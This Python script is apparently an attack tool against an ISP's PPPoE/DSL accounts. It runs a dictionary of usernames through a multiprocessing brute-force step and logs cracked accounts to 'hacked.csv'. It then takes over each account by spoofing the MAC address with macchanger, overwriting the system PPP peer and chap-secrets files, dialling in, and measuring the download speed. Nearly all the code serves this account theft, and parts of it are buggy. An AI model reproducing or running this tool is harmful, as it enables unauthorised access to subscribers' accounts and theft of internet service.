import os
from ob_request import User
from helper import *
import multiprocessing as mp
from tqdm import *
import speedtest

TESTED = []
dsl = 'noipdefault\ndefaultroute\nreplacedefaultroute\nhide-password\nnoauth\npersist\nplugin rp-pppoe.so eth0\nuser "{}"\nusepeerdns'


def init(args):
    global TESTED
    TESTED = args


def attack(username):
    if username not in TESTED:
        try:
            user = User(username.replace('\n', ''))
            user.execute()
            if user:
                write('hacked.csv', str(user))
            write('tested.txt', username)
        except:
            pass


def generate_username():
    dict_path = input('Enter the dictionary filepath: ')

    if os.path.isfile(dict_path):
        global TESTED
        TESTED = list(open('tested.txt', 'r'))
        usernames = list(open(dict_path, 'r'))

        with mp.Pool(mp.cpu_count(), initializer=init, initargs=(TESTED,)) as p:
            with tqdm(total=len(usernames)) as pbar:
                for i, _ in enumerate(p.imap_unordered(attack, usernames)):
                    pbar.update()
    else:
        print('File not found')


def test_speed():
    s = speedtest.Speedtest()
    s.get_servers()
    s.get_best_server()
    s.download()
    res = s.results.dict()
    return '{:.2f} MB/s'.format(res["download"] / 8000000)


def test_username():
    for i in open('hacked.csv', 'r').readlines():
        account = i.split(',')
        os.system('poff')
        os.system('ifconfig eth0 down')
        os.system(f'macchanger -m {account[1]} eth0')
        os.system('ifconfig eth0 up')
        with open('/etc/ppp/peers/dsl-provider', 'w') as f:
            f.write(dsl.format(account[0]))
        with open('/etc/ppp/chap-secrets') as f:
            f.write(f'"{account[0]}" * "1234')
        os.system('pon dsl-provider')
        retry = 5
        connected = False
        connected_account: str
        while connected != True & retry > 0:
            try:
                speed = test_speed()
                write('succesfull.csv', f'{i[:-1]},{speed}\n')
                connected = True
            except:
                retry = retry - 1


def switch_connection():
    print('switch')


MENU = {
    1: generate_username,
    2: test_username,
    3: switch_connection,
    4: exit
}

if __name__ == '__main__':
    print('============================================')
    print('1.Generate username list')
    print('2.Test username')
    print('3.Switch username')
    print('4.Exit')
    print('============================================')
    MENU.get(int(input('\nSelect an options : ')), lambda: 'Invalid option selected')()
